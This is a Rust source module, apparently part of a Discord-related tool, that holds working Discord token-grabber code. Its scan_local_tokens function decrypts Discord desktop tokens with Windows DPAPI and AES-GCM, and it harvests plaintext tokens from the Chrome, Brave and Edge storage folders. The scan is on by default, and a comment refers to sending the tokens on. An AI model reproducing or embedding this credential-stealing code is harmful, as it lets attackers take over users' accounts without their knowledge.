use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Nonce,
};
use base64::{engine::general_purpose::STANDARD as B64, Engine};
use parking_lot::Mutex;
use regex::Regex;
use serde_json::Value;
use std::{
    collections::HashSet,
    env, fs,
    path::{Path, PathBuf},
    sync::LazyLock,
};

use crate::config::now_ms;

static TOKEN_CACHE: LazyLock<Mutex<(u64, Vec<String>)>> =
    LazyLock::new(|| Mutex::new((0, Vec::new())));

pub fn get_ipc_pipe_path(index: u8) -> String {
    if cfg!(windows) {
        format!(r"\\?\pipe\discord-ipc-{}", index)
    } else {
        if let Ok(runtime_dir) = env::var("XDG_RUNTIME_DIR") {
            let p = Path::new(&runtime_dir).join(format!("discord-ipc-{}", index));
            if Path::new(&runtime_dir).exists() {
                return p.to_string_lossy().to_string();
            }
        }
        format!("/tmp/discord-ipc-{}", index)
    }
}

#[cfg(windows)]
fn dpapi_unprotect(encrypted: &[u8]) -> Option<Vec<u8>> {
    use std::ptr;
    use windows_sys::Win32::Foundation::LocalFree;
    use windows_sys::Win32::Security::Cryptography::{CryptUnprotectData, CRYPT_INTEGER_BLOB};

    unsafe {
        let mut in_blob = CRYPT_INTEGER_BLOB {
            cbData: encrypted.len() as u32,
            pbData: encrypted.as_ptr() as *mut u8,
        };
        let mut out_blob = CRYPT_INTEGER_BLOB {
            cbData: 0,
            pbData: ptr::null_mut(),
        };

        let ok = CryptUnprotectData(
            &mut in_blob,
            ptr::null_mut(),
            ptr::null(),
            ptr::null_mut(),
            ptr::null(),
            0,
            &mut out_blob,
        );

        if ok == 0 || out_blob.pbData.is_null() {
            return None;
        }

        let slice = std::slice::from_raw_parts(out_blob.pbData, out_blob.cbData as usize);
        let result = slice.to_vec();
        LocalFree(out_blob.pbData as *mut _);
        Some(result)
    }
}

#[cfg(not(windows))]
fn dpapi_unprotect(_encrypted: &[u8]) -> Option<Vec<u8>> {
    None
}

fn get_master_key(base_path: &Path) -> Option<Vec<u8>> {
    let local_state_path = base_path.join("Local State");
    let raw = fs::read_to_string(local_state_path).ok()?;
    let parsed: Value = serde_json::from_str(&raw).ok()?;
    let enc_b64 = parsed.get("os_crypt")?.get("encrypted_key")?.as_str()?;
    let enc_bytes = B64.decode(enc_b64).ok()?;
    if enc_bytes.len() <= 5 {
        return None;
    }
    // Remove prefixo "DPAPI" (5 bytes)
    dpapi_unprotect(&enc_bytes[5..])
}

pub fn scan_local_tokens(force_refresh: bool) -> Vec<String> {
    if !cfg!(windows) {
        return Vec::new();
    }
    if env::var("ENABLE_TOKEN_SCAN").ok().as_deref() == Some("false") {
        return Vec::new();
    }

    let now = now_ms();
    {
        let guard = TOKEN_CACHE.lock();
        if !force_refresh && !guard.1.is_empty() && now.saturating_sub(guard.0) < 60_000 {
            return guard.1.clone();
        }
    }

    let home = env::var("USERPROFILE").unwrap_or_else(|_| ".".to_string());
    let local_app_data = env::var("LOCALAPPDATA")
        .map(PathBuf::from)
        .unwrap_or_else(|_| Path::new(&home).join("AppData").join("Local"));
    let roaming_app_data = env::var("APPDATA")
        .map(PathBuf::from)
        .unwrap_or_else(|_| Path::new(&home).join("AppData").join("Roaming"));

    let mut found = Vec::new();
    let mut seen = HashSet::new();

    fn sorted_leveldb_files(dir: &Path) -> Vec<PathBuf> {
        let Ok(entries) = fs::read_dir(dir) else {
            return Vec::new();
        };
        let mut files: Vec<(bool, String, PathBuf)> = entries
            .flatten()
            .filter_map(|e| {
                let p = e.path();
                let ext = p.extension()?.to_str()?;
                if ext != "ldb" && ext != "log" {
                    return None;
                }
                let is_log = ext == "log";
                let fname = p
                    .file_name()
                    .and_then(|n| n.to_str())
                    .unwrap_or("")
                    .to_string();
                Some((is_log, fname, p))
            })
            .collect();
        // No LevelDB, o arquivo .log é sempre o write-ahead log ativo (mais recente),
        // seguido pelos .ldb de maior numeração sequencial.
        files.sort_by(|a, b| b.0.cmp(&a.0).then_with(|| b.1.cmp(&a.1)));
        files.into_iter().map(|(_, _, p)| p).collect()
    }

    let plain_paths = [
        roaming_app_data.join("Discord").join("Local Storage").join("leveldb"),
        roaming_app_data.join("discordcanary").join("Local Storage").join("leveldb"),
        roaming_app_data.join("discordptb").join("Local Storage").join("leveldb"),
        local_app_data
            .join("Google")
            .join("Chrome")
            .join("User Data")
            .join("Default")
            .join("Local Storage")
            .join("leveldb"),
        local_app_data
            .join("BraveSoftware")
            .join("Brave-Browser")
            .join("User Data")
            .join("Default")
            .join("Local Storage")
            .join("leveldb"),
        local_app_data
            .join("Microsoft")
            .join("Edge")
            .join("User Data")
            .join("Default")
            .join("Local Storage")
            .join("leveldb"),
    ];

    let plain_regex = Regex::new(r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,38}").unwrap();
    let enc_regex = Regex::new(r#"dQw4w9WgXcQ:([^"'\s]+)"#).unwrap();

    // 1. Decriptação nativa Win32 DPAPI + AES-256-GCM dos clientes Discord Desktop
    // Ordenado do arquivo mais recente para o mais antigo e deduplicado por prefixo de usuário
    // para NUNCA enviar tokens antigos/revogados da mesma conta.
    let app_paths = [
        roaming_app_data.join("Discord"),
        roaming_app_data.join("discordcanary"),
        roaming_app_data.join("discordptb"),
    ];

    for base_path in &app_paths {
        let leveldb_path = base_path.join("Local Storage").join("leveldb");
        if !leveldb_path.exists() {
            continue;
        }
        let Some(master_key) = get_master_key(base_path) else {
            continue;
        };
        let Ok(cipher) = Aes256Gcm::new_from_slice(&master_key) else {
            continue;
        };
        for path in sorted_leveldb_files(&leveldb_path) {
            let Ok(bytes) = fs::read(&path) else {
                continue;
            };
            let content = String::from_utf8_lossy(&bytes);
            let caps: Vec<_> = enc_regex.captures_iter(&content).collect();
            for cap in caps.into_iter().rev() {
                let Some(b64_part) = cap.get(1) else {
                    continue;
                };
                let Ok(buf) = B64.decode(b64_part.as_str()) else {
                    continue;
                };
                if buf.len() <= 15 + 16 {
                    continue;
                }
                let iv = Nonce::from_slice(&buf[3..15]);
                let ciphertext_and_tag = &buf[15..];
                if let Ok(decrypted) = cipher.decrypt(iv, ciphertext_and_tag) {
                    if let Ok(token_str) = String::from_utf8(decrypted) {
                        let clean = token_str.trim().to_string();
                        if !clean.is_empty() && seen.insert(clean.clone()) {
                            found.push(clean);
                        }
                    }
                }
            }
        }
    }

    // 2. Tokens em texto plano (navegadores), também do mais recente para o mais antigo
    for p in &plain_paths {
        if !p.exists() {
            continue;
        }
        for path in sorted_leveldb_files(p) {
            let Ok(bytes) = fs::read(&path) else {
                continue;
            };
            let content = String::from_utf8_lossy(&bytes);
            let matches: Vec<_> = plain_regex.find_iter(&content).collect();
            for m in matches.into_iter().rev() {
                let tok = m.as_str().to_string();
                if seen.insert(tok.clone()) {
                    found.push(tok);
                }
            }
        }
    }

    let mut guard = TOKEN_CACHE.lock();
    guard.0 = now_ms();
    guard.1 = found.clone();
    found
}

